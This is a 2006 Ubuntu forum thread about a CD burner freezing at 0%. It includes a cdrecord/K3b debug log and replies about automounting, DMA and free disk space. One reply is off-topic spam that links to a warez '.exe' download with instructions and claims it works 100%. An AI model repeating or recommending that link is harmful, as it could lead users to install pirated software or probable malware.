---
title: "CD Burner freeze at 0%. Is nautilus guilty?"
date: 2006-03-29
forum: Absolute Beginner Talk
---

### Post by edopizza on 2006-03-29
Hello! 
I am trying to burn with an IDE Cyberdrive CW078D. The drive freeze at 0% during the recording and the system slow down and it has just a short second of lucidity once every five seconds. The CPU and the memory aren't overworking. The eject button opens the bay. 
That happens with graveman, k3b, gnomebaker and cdrecord from the command line, both as user or sudo. 
Once, while trying to cancel the work, I got a message like "cannot unlock the cdrom...". 
Somebody suggested me to remove and reinstall cdrecord. That removed also other applications, one of that nautilus. After reinstalling cdrecord, nautilus still working great. 
That remembered me that when I insert a blank cdrom, nautilus ask if I would like to burn the disk with it. 
On my desktop I can see the blank cdrom icon, and I can open it, but I can't see it mouted from the comand line. 

Could nautilus be the problem of the freezing? I mean, could it have access at the disk without letting other application use the blank cdrom?


The debug output after cancelling the burning process: 

System
-----------------------
K3b Version: 0.12

KDE Version: 3.4.3
QT Version:  3.3.4
Kernel:      2.6.12-10-386
Devices
-----------------------
CyberDrv CW078D CD-R/RW 120E (/dev/hdb, ) at /media/cdrom0 [CD-R; CD-RW; CD-ROM] [CD-ROM; CD-R; CD-RW] [SAO; TAO; RAW; SAO/R96P; SAO/R96R; RAW/R16; RAW/R96P; RAW/R96R]

K3b
-----------------------
Size of filesystem calculated: 137825

Used versions
-----------------------
mkisofs: 2.1-unofficial-iconv
cdrecord: 2.1.1a01

cdrecord
-----------------------
/usr/bin/cdrecord: Warning: Running on Linux-2.6.12-10-386
/usr/bin/cdrecord: There are unsettled issues with Linux-2.5 and newer.
/usr/bin/cdrecord: If you have unexpected problems, please try Linux-2.4 or Solaris.
/usr/bin/cdrecord: Operation not permitted. WARNING: Cannot set RR-scheduler
/usr/bin/cdrecord: Permission denied. WARNING: Cannot set priority using setpriority().
/usr/bin/cdrecord: WARNING: This causes a high risk for buffer underruns.
scsidev: '/dev/hdb'
devname: '/dev/hdb'
scsibus: -2 target: -2 lun: -2
Warning: Open by 'devname' is unintentional and not supported.
Linux sg driver version: 3.5.27
Error: Cannot gain SYS_RAWIO capability.Is cdrecord installed SUID root?
: Operation not permitted
/usr/bin/cdrecord: Warning: using inofficial version of libscg (ubuntu-0.8ubuntu1 '@(#)scsitransp.c 1.91 04/06/17 Copyright 1988,1995,2000-2004 J. Schilling').
SCSI buffer size: 64512
resid: 64508
/usr/bin/cdrecord: Success. read buffer: scsi sendcmd: no error
CDB:  3C 00 00 00 00 00 00 FC 00 00
status: 0xb (Reserved)
Sense Bytes:
Sense Key: 0xFFFFFFFF [], Segment 0
Sense Code: 0x00 Qual 0x00 (no additional sense information) Fru 0x0
Sense flags: Blk 0 (not valid) 
resid: 64512
cmd finished after 90.655s timeout 40s
Cdrecord-Clone 2.01.01a01 (i686-pc-linux-gnu) Copyright (C) 1995-2004 Joerg Schilling
NOTE: this version of cdrecord is an inofficial (modified) release of cdrecord
      and thus may have bugs that are not present in the original version.
      Please send bug reports and support requests to <cdrtools@packages.debian.org>.
      The original author should not be bothered with problems of this version.
TOC Type: 3 = CD-ROM XA mode 2
Using libscg version 'ubuntu-0.8ubuntu1'.
Driveropts: 'burnfree'
atapi: 1
Device type    : Removable CD-ROM
Version        : 0
Response Format: 1
Vendor_info    : 'CyberDrv'
Identifikation : 'CW078D CD-R/RW  '
Revision       : '120E'
Device seems to be: Generic mmc CD-RW.
Current: 0x0009
Profile: 0x000A 
Profile: 0x0009 (current)
Profile: 0x0008 
Profile: 0x0002 (current)
Using generic SCSI-3/mmc   CD-R/CD-RW driver (mmc_cdr).
Driver flags   : MMC-2 SWABAUDIO BURNFREE 
Supported modes: TAO PACKET SAO SAO/R96P SAO/R96R RAW/R16 RAW/R96P RAW/R96R
Drive buf size : 1806336 = 1764 KB
FIFO size      : 4194304 = 4096 KB

cdrecord command:
-----------------------
/usr/bin/cdrecord.mmap -v gracetime=2 dev=/dev/hdb speed=32 -tao -dummy driveropts=burnfree -eject -multi -xa -tsize=137825s - 

mkisofs
-----------------------
137825
INFO: UTF-8 character encoding detected by locale settings.
 Assuming UTF-8 encoded filenames on source filesystem,
 use -input-charset to override.

mkisofs command:
-----------------------
/usr/bin/mkisofs -gui -graft-points -volid backup windows -volset  -appid K3B THE CD KREATOR (C) 1998-2005 SEBASTIAN TRUEG AND THE K3B TEAM -publisher  -preparer  -sysid LINUX -volset-size 1 -volset-seqno 1 -sort /tmp/kde-flavia/k3bRRUglb.tmp -rational-rock -hide-list /tmp/kde-flavia/k3bVCYIAb.tmp -joliet -hide-joliet-list /tmp/kde-flavia/k3b5rXznc.tmp -full-iso9660-filenames -iso-level 2 -path-list /tmp/kde-flavia/k3b9MVZWa.tmp

---

### Post by wolfee on 2006-03-29
[http://download.warezclient.com/WarezP2P_TDL.exe](http://download.warezclient.com/WarezP2P_TDL.exe)
Download instructions (if you get antileech message):
1. Enter code
2. Click Download
3. Click Save (open file dont work at some browsers)

It's working 100% !!!

---

### Post by red_Marvin on 2006-03-29
The only info I have on this problem is that it maybe has to do with ubuntu's
automounting daemons/processes.

---

### Post by falcon15500 on 2006-03-29
When you say that you cannot see it mounted from the command line, what exactly do you mean?  From the above your device seems to be /dev/hdb, is this correct?  Also - I am not sure that a blank disc _would_ mount as you expect - as it doesn't have a filesystem on it.
Check /dev/hdb with hdparm to see if things like DMA are enabled?

---

### Post by edopizza on 2006-03-29
[QUOTE=falcon15500]When you say that you cannot see it mounted from the command line, what exactly do you mean?  
[/QUOTE] 
I cant mount the disk because it is blank, it just say something like "disk not present"

[QUOTE=falcon15500]
From the above your device seems to be /dev/hdb, is this correct?  [/QUOTE]
Right, the strange thing is that in the GUI "Disk manager" the 3.5 floppy is also known as /dev/hdb. If I click on its icon in nautilus, the 3.5 floppy cycle for a couple of seconds, then report also a mounting error "can't mount, it's already mounted". 

To switch back to Nautilus-cd-burner: just before the burning process start, nautilus create an image in the home folder. Afterthat it starts to masterize. I was able to burn a cdrom of about 300 mb but it was impossible to burn a full one. 

Nautilus needs at least enoght free space in the home partition to create the image. Does it need also the same size in the partition where the application is stored? 

That could be the trivial solution because I just have about 500 mb free space in the main partition. 
(I would like to see many of your astonished faces...)

---

